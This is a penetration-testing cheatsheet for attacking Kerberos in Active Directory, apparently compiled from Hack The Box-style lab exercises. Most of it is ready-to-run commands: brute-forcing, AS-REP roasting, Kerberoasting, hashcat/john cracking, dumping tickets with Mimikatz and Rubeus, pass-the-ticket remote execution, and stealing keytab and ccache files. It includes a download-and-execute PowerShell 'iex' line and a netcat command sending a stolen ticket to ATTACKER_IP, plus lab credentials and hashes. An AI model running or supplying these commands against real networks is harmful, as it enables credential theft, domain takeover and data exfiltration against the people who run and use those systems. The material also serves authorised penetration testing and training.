# Kerberos cheatsheet

## Bruteforcing

With [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute):

```shell
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
```

With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:

```shell
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```

## ASREPRoast

### Enumeration
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

### Linux (Impacket)

```shell
# With credentials
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# No credentials - spray a user list
GetNPUsers.py <DOMAIN>/ -dc-ip <dc_ip> -no-pass -usersfile valid_ad_users

# Single user no password
python3 GetNPUsers.py COMPANY.local/james -no-pass -dc-ip 172.16.1.20
```

### Windows (Rubeus)

```powershell
.\Rubeus.exe asreproast /user:<user> /nowrap /format:hashcat

# All users in current domain
.\Rubeus.exe asreproast /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
```

### Cracking

```shell
hashcat -m 18200 asrep_hashes /usr/share/wordlists/rockyou.txt

john --wordlist=<passwords_file> <AS_REP_responses_file>
```

### SPN Service Principal Name Overview&#x20;

* The structure of an SPN consists of three (3) main parts: **Service Class**: the service type, i.e., _SQL, Web, Exchange, File,_ etc., and the **Host** where the service is usually running in the format of **FQDN** _(Fully Qualified Domain Name)_&#x61;nd **port number**.&#x20;
*   For example, below, the Microsoft SQL service runs on the **`dcorp-mgmt`** host on port 1443.

    The SPN is **`MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433`**

## Kerberoasting

* Great reading:
* [https://specterops.gitbook.io/ghostpack/rubeus/roasting](https://specterops.gitbook.io/ghostpack/rubeus/roasting)

### Enumeration
```powershell
# PowerView - find kerberoastable accounts
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | Select samaccountname,ServicePrincipalName

# setspn.exe (built-in)
setspn.exe -Q */*
```

### Impacket (Linux)

```shell
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
python3 GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

If you get **KRB\_AP\_ERR\_SKEW(Clock skew too great)**, sync time with the DC: `ntpdate <IP of DC>`

### Rubeus

```shell
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>

# Stats first (check RC4 vs AES, prioritize RC4)
.\Rubeus.exe kerberoast /stats

# Filter for high-value targets
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Target specific user
.\Rubeus.exe kerberoast /user:<target> /nowrap
```

### PowerShell

```powershell
# Invoke-Kerberoast.ps1
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Import-Module .\invoke-kerberoast.ps1
Invoke-Kerberoast -Domain active.htb -OutputFormat Hashcat | fl
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>

# PowerView - request ticket for specific user
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
```

### Native PowerShell (.NET)
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/host.domain.local:1433"
```

### Cracking

```shell
hashcat -m 13100 --force <TGSs_file> <passwords_file>

john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
```

### Mimikatz Ticket Export

```
mimikatz # kerberos::list /export
```
```
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

### Targeted Kerberoasting (via GenericAll/GenericWrite)
- If you have write access over a user, set a fake SPN then Kerberoast it
```powershell
Set-DomainObject -Credential $Cred -Identity <user> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:<user> /nowrap

# Cleanup after cracking
Set-DomainObject -Credential $Cred -Identity <user> -Clear serviceprincipalname -Verbose
```

### Harvest tickets from Windows

With [Mimikatz](https://github.com/gentilkiwi/mimikatz):

```shell
mimikatz # sekurlsa::tickets /export
```

With [Rubeus](https://github.com/GhostPack/Rubeus) in Powershell:

```shell
.\Rubeus dump

# After dump with Rubeus tickets in base64, to write the in a file
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))
```

To convert tickets between Linux/Windows format with [ticket\_converter.py](https://github.com/Zer1t0/ticket_converter):

```
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```

### Using ticket in Linux:

With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:

```shell
# Set the ticket for impacket use
export KRB5CCNAME=<TGT_ccache_file_path>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

### Using ticket in Windows

Inject ticket with [Mimikatz](https://github.com/gentilkiwi/mimikatz):

```shell
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):

```shell
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):

```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

## Misc

To get NTLM from password:

```python
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
```

## Keytab File Extraction

Find keytab files on a compromised Linux host:

```bash
find / -name *keytab* -ls 2>/dev/null
find / -name '*.kt*' -ls 2>/dev/null
```

Extract hashes from a keytab file:

```bash
python3 keytabextract.py /opt/specialfiles/carlos.keytab
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : carlos/
	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
	AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

### Import and Use a Keytab

```bash
kinit svc_workstations@INLANEFREIGHT.HTB -k -t /path/to/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass
```

### SSH with Kerberos Principal

```bash
ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
```

---

## Ccache Impersonation

Ccache files store Kerberos tickets on Linux. Look for them in `/tmp`:

```bash
ls -la /tmp
# Look for files like: krb5cc_647401106_EcdLGj
```

### Check Ccache Validity

```bash
klist -c /tmp/krb5cc_647401106_JWxczE
Ticket cache: FILE:/tmp/krb5cc_647401106_JWxczE
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
03/06/2026 02:04:14  03/06/2026 12:04:14  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
```

### Use a Ccache File

```bash
export KRB5CCNAME=/tmp/krb5cc_647401106_JWxczE

# Access shares
smbclient //dc01/C$ -k -c ls -no-pass

# Interactive SMB session
smbclient //DC01/julio -N

# Evil-WinRM with Kerberos
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

### Use Ccache Through a Proxy

```bash
export KRB5CCNAME=/tmp/ccache_file.txt
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

### Linikatz — Machine Account Authentication

Use linikatz to authenticate with the machine's Kerberos ticket:

```bash
# Check the SSS ticket cache
export KRB5CCNAME=FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
klist
smbclient //DC01/linux01 -N
```

---

## Ticket Conversion

Convert between ccache (Linux) and kirbi (Windows) formats:

```bash
# ccache to kirbi
impacket-ticketConverter /tmp/julio.ccache julio.kirbi

# kirbi to ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
```

**Note:** If the ccache is already in the correct format for your tool, don't convert it — just set `KRB5CCNAME`.

---

## Transfer Ccache Off Target

When you need to exfiltrate a ccache file from a compromised Linux host:

```bash
# On target
nc ATTACKER_IP 1234 < /tmp/krb5cc_647401106_JWxczE

# On attacker
nc -nvlp 1234 > stolen.ccache
```

---

## krb5.conf Setup

For Kerberos authentication to work from your attack machine, configure `/etc/krb5.conf`:

```ini
[libdefaults]
 default_realm = INLANEFREIGHT.LOCAL
 rdns = false

[realms]
 INLANEFREIGHT.LOCAL = {
     kdc = dc01.inlanefreight.local
     admin_server = dc01.inlanefreight.local
 }
```

### /etc/hosts Setup

```
10.129.234.174 inlanefreight.local   inlanefreight   dc01.inlanefreight.local  dc01
```

Verify DNS resolution:

```bash
getent hosts dc01.inlanefreight.local
10.129.234.174  inlanefreight.local inlanefreight dc01.inlanefreight.local dc01
```

---

## Tools

* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Rubeus](https://github.com/Zer1t0/Rubeus) with brute module
* [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
* [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute)
* [tickey](https://github.com/TarlogicSecurity/tickey)
* [ticket\_converter.py](https://github.com/Zer1t0/ticket_converter)
